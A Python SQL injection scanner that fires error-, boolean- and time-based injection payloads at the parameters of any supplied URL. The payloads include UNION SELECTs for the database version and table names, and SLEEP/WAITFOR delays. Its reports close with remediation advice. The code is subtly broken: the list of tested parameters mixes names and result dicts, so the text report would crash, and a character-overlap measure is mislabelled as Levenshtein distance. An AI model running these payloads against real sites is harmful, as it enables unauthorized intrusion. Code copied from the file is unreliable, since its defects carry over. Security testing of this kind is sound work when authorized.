"""
SQL Injection Tester

This script provides tools to detect and demonstrate SQL injection vulnerabilities
in web applications for educational purposes. It helps identify potential entry points
for SQL injection and demonstrates proper protection techniques.

This tool is intended for educational purposes and authorized security assessment only.
"""

import re
import requests
import logging
import argparse
import json
import random
import time
import urllib.parse
from bs4 import BeautifulSoup
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# SQL Injection payloads for detection
DETECTION_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "') OR ('1'='1",
    "\") OR (\"1\"=\"1",
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "' OR 1=1#",
    "\" OR 1=1#",
    "' OR '1'='1' --",
    "1' OR '1'='1",
    "1\" OR \"1\"=\"1",
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL --",
    "'; WAITFOR DELAY '0:0:5' --",  # Time-based (MSSQL)
    "'; SELECT pg_sleep(5) --",     # Time-based (PostgreSQL)
    "'; SELECT SLEEP(5) --",        # Time-based (MySQL)
    "1 OR SLEEP(5)",                # Time-based (MySQL)
    "1' AND (SELECT 1 FROM (SELECT SLEEP(5))A) --",  # Time-based (MySQL)
    "' OR NOT '1'='2"
]

# Error-based payloads
ERROR_PAYLOADS = [
    "'",
    "\"",
    "\\",
    ";",
    "' OR 1=1; --",
    "' AND 1=0 UNION SELECT @@version --",
    "' AND 1=0 UNION SELECT banner FROM v$version --",
    "' AND 1=0 UNION SELECT version() --",
    "' AND 1=0 UNION SELECT sqlite_version() --",
    "' AND 1=0 UNION SELECT table_name FROM information_schema.tables --",
    "' AND (SELECT 0x414243 FROM dual) --",
    "' AND EXTRACTVALUE(1, '//x') --",  # MySQL XML function error
    "' AND 1=CONVERT(int, '1x') --"     # MSSQL conversion error
]

# Database error patterns
ERROR_PATTERNS = [
    # MySQL
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "MySQLSyntaxErrorException",
    "valid MySQL result",
    "check the manual that corresponds to your MySQL server version",
    # MSSQL
    "Microsoft SQL Native Client error",
    "ODBC SQL Server Driver",
    "SQLServer JDBC Driver",
    "Warning: mssql_",
    "[Microsoft][SQL Server]",
    "OLE DB Provider for SQL Server",
    "Unclosed quotation mark after the character string",
    # Oracle
    "ORA-[0-9]",
    "Oracle error",
    "Oracle.*Driver",
    "Warning: oci_",
    "quoted string not properly terminated",
    # PostgreSQL
    "PostgreSQL.*ERROR",
    "Warning: pg_",
    "valid PostgreSQL result",
    "Npgsql.",
    "PG::SyntaxError:",
    # SQLite
    "SQLite/JDBCDriver",
    "SQLite.Exception",
    "System.Data.SQLite.SQLiteException",
    # Generic
    "SQL syntax.*error",
    "SQL Error",
    "SQLException",
    "syntax error",
    "SQLSTATE"
]

class SQLInjectionTester:
    """Class for testing SQL injection vulnerabilities in web applications."""
    
    def __init__(self, ua=None, proxy=None, timeout=10, verify_ssl=True, verbose=False):
        """
        Initialize the SQL injection tester.
        
        Parameters:
        -----------
        ua : str
            User agent string to use
        proxy : dict
            Proxy configuration (e.g., {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"})
        timeout : int
            Request timeout in seconds
        verify_ssl : bool
            Whether to verify SSL certificates
        verbose : bool
            Enable verbose output
        """
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.verbose = verbose
        
        # Set up session
        self.session = requests.Session()
        
        # Configure user agent
        if ua:
            self.user_agent = ua
        else:
            self.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        
        self.session.headers.update({'User-Agent': self.user_agent})
        
        # Configure proxy if provided
        if proxy:
            self.session.proxies.update(proxy)
            
        self.test_results = {}
    
    def scan_url_parameters(self, url):
        """
        Analyze URL for potential SQL injection points in GET parameters.
        
        Parameters:
        -----------
        url : str
            URL to analyze
            
        Returns:
        --------
        dict:
            Analysis results with potential injection points
        """
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        result = {
            'url': url,
            'method': 'GET',
            'injection_points': [],
            'recommendations': []
        }
        
        # Check if there are any query parameters
        if not query_params:
            result['recommendations'].append("No GET parameters found in the URL. Try adding parameters or testing POST endpoints.")
            return result
        
        # Analyze each parameter
        for param, values in query_params.items():
            param_info = {
                'parameter': param,
                'original_value': values[0],
                'is_potentially_vulnerable': True,
                'tests': []
            }
            
            # Check if parameter name suggests SQL connection
            sql_related_names = ['id', 'user', 'item', 'cat', 'product', 'category', 'order', 'key', 'search', 'query', 'page']
            if any(name in param.lower() for name in sql_related_names):
                param_info['parameter_note'] = "Parameter name suggests database interaction"
            
            # Check parameter value
            value = values[0]
            try:
                # If value is numeric, it might be a database ID
                int_value = int(value)
                param_info['value_type'] = 'numeric'
                param_info['value_note'] = "Numeric value suggests database ID - high chance of SQL injection"
            except ValueError:
                param_info['value_type'] = 'string'
                param_info['value_note'] = "String value - potential for quote-based SQL injection"
            
            result['injection_points'].append(param_info)
        
        # Add recommendations
        if result['injection_points']:
            result['recommendations'].append("Test each parameter with various SQL injection payloads")
            result['recommendations'].append("Use both error-based and time-based techniques")
            
        return result
    
    def test_url_for_sqli(self, url, parameters=None, method='GET', data=None, cookies=None, headers=None):
        """
        Test a URL for SQL injection vulnerabilities.
        
        Parameters:
        -----------
        url : str
            URL to test
        parameters : list
            List of GET parameters to test (all if None)
        method : str
            HTTP method ('GET' or 'POST')
        data : dict
            POST data to test (for POST method)
        cookies : dict
            Cookies to include in requests
        headers : dict
            Additional HTTP headers
            
        Returns:
        --------
        dict:
            Test results
        """
        # Initialize result
        result = {
            'url': url,
            'method': method,
            'starting_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'parameters_tested': [],
            'vulnerable_parameters': [],
            'error_based_detections': [],
            'time_based_detections': [],
            'boolean_based_detections': [],
            'is_vulnerable': False
        }
        
        # Parse URL and get parameters
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        # Determine parameters to test
        params_to_test = []
        if method == 'GET':
            if parameters:
                # Use specified parameters
                params_to_test = [p for p in parameters if p in query_params]
            else:
                # Test all parameters
                params_to_test = list(query_params.keys())
        else:  # POST
            if parameters:
                # Use specified parameters
                params_to_test = [p for p in parameters if p in (data or {})]
            else:
                # Test all parameters
                params_to_test = list((data or {}).keys())
        
        result['parameters_tested'] = params_to_test
        
        # If no parameters to test, return early
        if not params_to_test:
            result['message'] = "No parameters to test. Check URL or data payload."
            return result
        
        # Set up session parameters
        if cookies:
            self.session.cookies.update(cookies)
        if headers:
            self.session.headers.update(headers)
        
        # Test each parameter
        for param in params_to_test:
            param_results = {
                'parameter': param,
                'error_based_tests': [],
                'time_based_tests': [],
                'boolean_based_tests': [],
                'is_vulnerable': False
            }
            
            # Log parameter being tested
            logger.info(f"Testing parameter: {param}")
            
            # Get baseline response first
            try:
                if method == 'GET':
                    baseline_url = self._modify_url_parameter(url, param, query_params[param][0])
                    baseline_response = self.session.get(baseline_url, timeout=self.timeout, verify=self.verify_ssl)
                else:  # POST
                    baseline_data = data.copy() if data else {}
                    baseline_response = self.session.post(url, data=baseline_data, timeout=self.timeout, verify=self.verify_ssl)
                
                baseline_time = baseline_response.elapsed.total_seconds()
                baseline_content = baseline_response.text
                baseline_status = baseline_response.status_code
                
                # Store baseline info
                param_results['baseline'] = {
                    'response_time': baseline_time,
                    'status_code': baseline_status,
                    'content_length': len(baseline_content)
                }
                
            except Exception as e:
                logger.error(f"Error making baseline request: {str(e)}")
                param_results['error'] = f"Could not establish baseline: {str(e)}"
                result['parameters_tested'].append(param_results)
                continue
            
            # Test error-based injections
            error_based_vulnerabilities = []
            for payload in ERROR_PAYLOADS:
                try:
                    # Make request with payload
                    if method == 'GET':
                        test_url = self._modify_url_parameter(url, param, payload)
                        response = self.session.get(test_url, timeout=self.timeout, verify=self.verify_ssl)
                    else:  # POST
                        test_data = data.copy() if data else {}
                        test_data[param] = payload
                        response = self.session.post(url, data=test_data, timeout=self.timeout, verify=self.verify_ssl)
                    
                    # Check for SQL errors in response
                    is_error_detected = self._check_for_sql_errors(response.text)
                    content_diff = self._content_difference(baseline_content, response.text)
                    
                    test_result = {
                        'payload': payload,
                        'status_code': response.status_code,
                        'response_time': response.elapsed.total_seconds(),
                        'error_detected': is_error_detected,
                        'content_difference': f"{content_diff:.2f}%"
                    }
                    
                    param_results['error_based_tests'].append(test_result)
                    
                    if is_error_detected:
                        error_based_vulnerabilities.append({
                            'parameter': param,
                            'payload': payload,
                            'evidence': self._extract_error_evidence(response.text)
                        })
                        
                except Exception as e:
                    logger.error(f"Error testing payload {payload}: {str(e)}")
                    param_results['error_based_tests'].append({
                        'payload': payload,
                        'error': str(e)
                    })
            
            # Test boolean-based injections
            boolean_based_vulnerabilities = []
            for payload in DETECTION_PAYLOADS:
                try:
                    # Make request with payload
                    if method == 'GET':
                        test_url = self._modify_url_parameter(url, param, payload)
                        response = self.session.get(test_url, timeout=self.timeout, verify=self.verify_ssl)
                    else:  # POST
                        test_data = data.copy() if data else {}
                        test_data[param] = payload
                        response = self.session.post(url, data=test_data, timeout=self.timeout, verify=self.verify_ssl)
                    
                    # Look for significant changes in response
                    content_diff = self._content_difference(baseline_content, response.text)
                    status_change = baseline_status != response.status_code
                    
                    # Check for significant changes that might indicate successful injection
                    is_significant_change = (
                        content_diff > 40 or  # Large content difference
                        status_change or      # Status code change
                        len(response.text) > len(baseline_content) * 2  # Response size doubled
                    )
                    
                    test_result = {
                        'payload': payload,
                        'status_code': response.status_code,
                        'response_time': response.elapsed.total_seconds(),
                        'content_difference': f"{content_diff:.2f}%",
                        'significant_change': is_significant_change
                    }
                    
                    param_results['boolean_based_tests'].append(test_result)
                    
                    if is_significant_change:
                        boolean_based_vulnerabilities.append({
                            'parameter': param,
                            'payload': payload,
                            'content_difference': f"{content_diff:.2f}%"
                        })
                        
                except Exception as e:
                    logger.error(f"Error testing payload {payload}: {str(e)}")
                    param_results['boolean_based_tests'].append({
                        'payload': payload,
                        'error': str(e)
                    })
            
            # Test time-based injections (simplified for educational purposes)
            time_based_vulnerabilities = []
            time_payloads = [p for p in DETECTION_PAYLOADS if 'SLEEP' in p or 'DELAY' in p or 'pg_sleep' in p]
            
            for payload in time_payloads[:2]:  # Limit to 2 time-based tests for performance
                try:
                    start_time = time.time()
                    
                    # Make request with payload
                    if method == 'GET':
                        test_url = self._modify_url_parameter(url, param, payload)
                        response = self.session.get(test_url, timeout=self.timeout * 2, verify=self.verify_ssl)
                    else:  # POST
                        test_data = data.copy() if data else {}
                        test_data[param] = payload
                        response = self.session.post(url, data=test_data, timeout=self.timeout * 2, verify=self.verify_ssl)
                    
                    request_time = time.time() - start_time
                    
                    # Check if response was delayed significantly
                    is_delayed = request_time > baseline_time * 2 and request_time > 4  # At least 4 seconds delay
                    
                    test_result = {
                        'payload': payload,
                        'status_code': response.status_code,
                        'response_time': request_time,
                        'baseline_time': baseline_time,
                        'delay_detected': is_delayed
                    }
                    
                    param_results['time_based_tests'].append(test_result)
                    
                    if is_delayed:
                        time_based_vulnerabilities.append({
                            'parameter': param,
                            'payload': payload,
                            'delay': f"{request_time:.2f}s vs baseline {baseline_time:.2f}s"
                        })
                        
                except requests.exceptions.Timeout:
                    # Timeout might actually be a positive signal for time-based SQLi
                    test_result = {
                        'payload': payload,
                        'status_code': 'timeout',
                        'response_time': self.timeout * 2,
                        'baseline_time': baseline_time,
                        'delay_detected': True
                    }
                    
                    param_results['time_based_tests'].append(test_result)
                    
                    time_based_vulnerabilities.append({
                        'parameter': param,
                        'payload': payload,
                        'delay': f"Timeout ({self.timeout * 2}s) vs baseline {baseline_time:.2f}s"
                    })
                    
                except Exception as e:
                    logger.error(f"Error testing payload {payload}: {str(e)}")
                    param_results['time_based_tests'].append({
                        'payload': payload,
                        'error': str(e)
                    })
            
            # Update parameter vulnerability status
            param_results['is_vulnerable'] = (
                len(error_based_vulnerabilities) > 0 or 
                len(boolean_based_vulnerabilities) > 0 or 
                len(time_based_vulnerabilities) > 0
            )
            
            if param_results['is_vulnerable']:
                result['vulnerable_parameters'].append(param)
                result['is_vulnerable'] = True
                
                if error_based_vulnerabilities:
                    result['error_based_detections'].extend(error_based_vulnerabilities)
                if boolean_based_vulnerabilities:
                    result['boolean_based_detections'].extend(boolean_based_vulnerabilities)
                if time_based_vulnerabilities:
                    result['time_based_detections'].extend(time_based_vulnerabilities)
            
            # Add parameter results to overall results
            result['parameters_tested'].append(param_results)
        
        # Add timestamp
        result['completion_time'] = time.strftime('%Y-%m-%d %H:%M:%S')
        
        # Add recommendations if vulnerable
        if result['is_vulnerable']:
            result['recommendations'] = self._generate_recommendations(result)
            
        return result
    
    def _modify_url_parameter(self, url, param, value):
        """
        Modify a parameter in the URL.
        
        Parameters:
        -----------
        url : str
            Original URL
        param : str
            Parameter to modify
        value : str
            New parameter value
            
        Returns:
        --------
        str:
            Modified URL
        """
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        # Update parameter
        query_params[param] = [value]
        
        # Build new query string
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        
        # Build new URL
        new_parsed = parsed_url._replace(query=new_query)
        return urllib.parse.urlunparse(new_parsed)
    
    def _check_for_sql_errors(self, content):
        """
        Check for SQL error messages in the response content.
        
        Parameters:
        -----------
        content : str
            Response content
            
        Returns:
        --------
        bool:
            True if SQL errors are detected, False otherwise
        """
        for pattern in ERROR_PATTERNS:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        return False
    
    def _extract_error_evidence(self, content):
        """
        Extract the SQL error message from the response content.
        
        Parameters:
        -----------
        content : str
            Response content
            
        Returns:
        --------
        str:
            Extracted error message
        """
        for pattern in ERROR_PATTERNS:
            match = re.search(f".*({pattern}).*", content, re.IGNORECASE)
            if match:
                context = self._get_error_context(content, match.group(0))
                return context
        return "SQL error detected but couldn't extract specific message"
    
    def _get_error_context(self, content, error_line, context_lines=1):
        """
        Get the context around an error line in the response content.
        
        Parameters:
        -----------
        content : str
            Response content
        error_line : str
            Line containing the error
        context_lines : int
            Number of lines to include before and after the error
            
        Returns:
        --------
        str:
            Error context
        """
        lines = content.splitlines()
        for i, line in enumerate(lines):
            if error_line in line:
                start = max(0, i - context_lines)
                end = min(len(lines), i + context_lines + 1)
                context = lines[start:end]
                return "\\n".join(context)
        return error_line
    
    def _content_difference(self, content1, content2):
        """
        Calculate the percentage difference between two response contents.
        
        Parameters:
        -----------
        content1 : str
            First content string
        content2 : str
            Second content string
            
        Returns:
        --------
        float:
            Percentage difference
        """
        # A very simple comparison - in a real tool we'd use more sophisticated algorithms
        len1 = len(content1)
        len2 = len(content2)
        
        # Strip HTML tags for more meaningful comparison
        try:
            soup1 = BeautifulSoup(content1, 'html.parser')
            soup2 = BeautifulSoup(content2, 'html.parser')
            text1 = soup1.get_text()
            text2 = soup2.get_text()
            
            # Calculate Levenshtein distance (simplified for educational purposes)
            # In a real tool, we'd use a proper implementation
            chars1 = set(text1)
            chars2 = set(text2)
            common_chars = len(chars1.intersection(chars2))
            unique_chars = len(chars1.union(chars2))
            
            if unique_chars == 0:
                return 0
            
            # Simple similarity measure
            similarity = common_chars / unique_chars
            difference = 100 * (1 - similarity)
            
            # Also consider difference in length
            length_diff = abs(len(text1) - len(text2)) / max(len(text1), len(text2)) * 100
            
            return (difference + length_diff) / 2
            
        except Exception:
            # Fallback to simple length comparison
            if max(len1, len2) == 0:
                return 0
            return 100 * abs(len1 - len2) / max(len1, len2)
    
    def _generate_recommendations(self, result):
        """
        Generate security recommendations based on test results.
        
        Parameters:
        -----------
        result : dict
            Test results
            
        Returns:
        --------
        list:
            Recommendations
        """
        recommendations = [
            "1. Use prepared statements or parameterized queries instead of dynamic SQL",
            "2. Implement input validation and sanitization for all user inputs",
            "3. Apply the principle of least privilege to database users",
            "4. Use an ORM (Object-Relational Mapping) framework with built-in injection protection",
            "5. Implement proper error handling to avoid leaking database information"
        ]
        
        if result['error_based_detections']:
            recommendations.append("6. Configure error messages to avoid displaying database-specific information")
        
        if result['time_based_detections']:
            recommendations.append("7. Consider implementing query timeout limits")
        
        if result['boolean_based_detections']:
            recommendations.append("8. Review authentication and data access logic for boolean-based vulnerabilities")
        
        return recommendations

def scan_url(url, method='GET', parameters=None, data=None, cookies=None, headers=None, timeout=10, verify_ssl=True):
    """
    Scan a URL for SQL injection vulnerabilities.
    
    Parameters:
    -----------
    url : str
        URL to scan
    method : str
        HTTP method ('GET' or 'POST')
    parameters : list
        List of parameters to test
    data : dict
        POST data (for POST method)
    cookies : dict
        Cookies to include in requests
    headers : dict
        Additional HTTP headers
    timeout : int
        Request timeout in seconds
    verify_ssl : bool
        Whether to verify SSL certificates
        
    Returns:
    --------
    dict:
        Scan results
    """
    tester = SQLInjectionTester(timeout=timeout, verify_ssl=verify_ssl)
    
    # Analyze URL for potential injection points
    analysis = tester.scan_url_parameters(url)
    
    # Test URL for SQLi vulnerabilities
    results = tester.test_url_for_sqli(
        url=url, 
        parameters=parameters, 
        method=method, 
        data=data, 
        cookies=cookies, 
        headers=headers
    )
    
    # Combine analysis with test results
    combined_results = {
        'url': url,
        'method': method,
        'analysis': analysis,
        'test_results': results,
        'is_vulnerable': results['is_vulnerable'],
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
    }
    
    return combined_results

def generate_report(scan_results, report_format='text'):
    """
    Generate a human-readable report from scan results.
    
    Parameters:
    -----------
    scan_results : dict
        Results from scan_url
    report_format : str
        Format of the report ('text', 'json')
        
    Returns:
    --------
    str:
        Formatted report
    """
    if report_format == 'json':
        return json.dumps(scan_results, indent=2)
    
    # Text report
    url = scan_results['url']
    method = scan_results['method']
    is_vulnerable = scan_results['is_vulnerable']
    
    report = [
        "SQL Injection Vulnerability Report",
        "===============================",
        f"Target URL: {url}",
        f"Method: {method}",
        f"Scan Time: {scan_results['timestamp']}",
        f"Vulnerability Detected: {'YES - SQL INJECTION VULNERABILITY FOUND' if is_vulnerable else 'No vulnerabilities detected'}",
        ""
    ]
    
    if is_vulnerable:
        report.append("== Vulnerable Parameters ==")
        for param in scan_results['test_results']['vulnerable_parameters']:
            report.append(f"- {param}")
        report.append("")
        
    # Add details on error-based detections
    error_detections = scan_results['test_results'].get('error_based_detections', [])
    if error_detections:
        report.append("== Error-Based SQL Injection ==")
        for detection in error_detections:
            report.append(f"Parameter: {detection['parameter']}")
            report.append(f"Payload: {detection['payload']}")
            report.append(f"Evidence: {detection['evidence']}")
            report.append("")
    
    # Add details on boolean-based detections
    boolean_detections = scan_results['test_results'].get('boolean_based_detections', [])
    if boolean_detections:
        report.append("== Boolean-Based SQL Injection ==")
        for detection in boolean_detections:
            report.append(f"Parameter: {detection['parameter']}")
            report.append(f"Payload: {detection['payload']}")
            report.append(f"Content Difference: {detection['content_difference']}")
            report.append("")
    
    # Add details on time-based detections
    time_detections = scan_results['test_results'].get('time_based_detections', [])
    if time_detections:
        report.append("== Time-Based SQL Injection ==")
        for detection in time_detections:
            report.append(f"Parameter: {detection['parameter']}")
            report.append(f"Payload: {detection['payload']}")
            report.append(f"Delay: {detection['delay']}")
            report.append("")
    
    # Add recommendations
    recommendations = scan_results['test_results'].get('recommendations', [])
    if recommendations:
        report.append("== Recommendations ==")
        for recommendation in recommendations:
            report.append(recommendation)
        report.append("")
    
    report.append("== Technical Details ==")
    report.append("Parameters tested: " + ", ".join(scan_results['test_results']['parameters_tested']))
    report.append("")
    
    report.append("== Educational Notes ==")
    report.append("SQL injection is a code injection technique used to attack data-driven applications")
    report.append("by inserting malicious SQL statements into entry fields for execution.")
    report.append("")
    report.append("Common types of SQL injection:")
    report.append("1. Error-based: Extracting information from database error messages")
    report.append("2. Boolean-based: Inferring information based on TRUE/FALSE responses")
    report.append("3. Time-based: Inferring information based on response timing")
    report.append("4. UNION-based: Using the UNION operator to combine results")
    report.append("")
    report.append("Prevention techniques:")
    report.append("1. Use prepared statements with parameterized queries")
    report.append("2. Use stored procedures")
    report.append("3. Validate and sanitize all user inputs")
    report.append("4. Escape special characters")
    report.append("5. Apply the principle of least privilege to database accounts")
    
    return "\n".join(report)

def main():
    """Main function to run the SQL injection tester from the command line."""
    parser = argparse.ArgumentParser(description='SQL Injection Tester (Educational Tool)')
    parser.add_argument('url', help='Target URL to test')
    parser.add_argument('-m', '--method', choices=['GET', 'POST'], default='GET', help='HTTP method')
    parser.add_argument('-p', '--parameters', help='Comma-separated list of parameters to test')
    parser.add_argument('-d', '--data', help='POST data in JSON format (for POST method)')
    parser.add_argument('-c', '--cookies', help='Cookies in JSON format')
    parser.add_argument('-H', '--headers', help='HTTP headers in JSON format')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout in seconds')
    parser.add_argument('-k', '--insecure', action='store_true', help='Allow insecure server connections')
    parser.add_argument('-o', '--output', help='Output file for scan results')
    parser.add_argument('-f', '--format', choices=['text', 'json'], default='text', help='Output format')
    
    args = parser.parse_args()
    
    # Parse command line arguments
    parameters = args.parameters.split(',') if args.parameters else None
    data = json.loads(args.data) if args.data else None
    cookies = json.loads(args.cookies) if args.cookies else None
    headers = json.loads(args.headers) if args.headers else None
    
    # Run scan
    logger.info(f"Starting SQL injection scan on: {args.url}")
    scan_results = scan_url(
        url=args.url,
        method=args.method,
        parameters=parameters,
        data=data,
        cookies=cookies,
        headers=headers,
        timeout=args.timeout,
        verify_ssl=not args.insecure
    )
    
    # Generate report
    report = generate_report(scan_results, args.format)
    
    # Output report
    if args.output:
        with open(args.output, 'w') as f:
            f.write(report)
        logger.info(f"Scan results saved to: {args.output}")
    else:
        print(report)

if __name__ == "__main__":
    main()